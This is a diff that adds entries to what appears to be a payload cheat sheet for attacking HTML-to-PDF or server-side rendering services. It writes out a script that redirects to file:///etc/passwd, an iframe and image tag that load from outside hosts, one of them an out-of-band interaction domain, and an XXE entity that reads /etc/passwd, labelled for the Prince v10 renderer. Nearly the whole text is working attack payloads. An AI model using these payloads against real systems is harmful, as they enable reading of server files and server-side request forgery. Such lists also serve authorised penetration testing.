@@ -69,9 +69,30 @@ http://127.0.0.1:8080/favicon.ico
 ```
 
 ```
-<script>window.location = "http://localhost;</script> 
+<script>window.location = "http://localhost"; </script>
 ```
 
 ```
-<script>window.location = http://localhost;</script> 
+<script>window.location = "file:///etc/passwd"; </script>
 ```
+
+instead of calling it directly,
+
+```
+<iframe/src=https://mywebsite.com/locationwhere.html>
+```
+
+## Chaining XML External Entity (XXE)
+
+```
+<img/src="https://puuatcmlkisigmqtcmzzjtswfv8t67vdw.oast.fun">
+```
+
+Get the user-agent --> # Prince v10
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
+<cdl>&asd;</cdl>
+```
+
+
